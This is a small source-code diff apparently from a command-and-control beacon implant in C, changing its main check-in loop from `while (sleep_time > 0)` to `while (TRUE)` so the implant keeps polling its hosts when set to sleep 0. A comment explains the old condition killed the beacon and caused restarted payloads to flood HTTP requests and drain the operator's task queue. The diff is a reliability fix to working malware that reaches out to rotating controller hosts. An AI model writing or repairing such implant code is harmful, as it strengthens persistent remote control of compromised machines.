@@ -157,7 +157,13 @@ void beacon(LPVOID lpReserved) {
 	/* 初始化代理 */
 	agent_init(buffer, MAX_GET);
 
-	while (sleep_time > 0) {
+	/* official semantics: sleep 0 = interactive (check in as fast as
+	 * possible), never loop exit. The old `while (sleep_time > 0)` gate
+	 * killed the beacon the moment a sleep-0 task landed: the own-exe
+	 * loader restarted the payload, fresh instances machine-gunned HTTP
+	 * GETs and drained the task queue out from under the UDC2 session
+	 * (live: pwd queued server-side, extc2 dump stayed empty). */
+	while (TRUE) {
 		// dlog("beacon.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n");
 
 		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
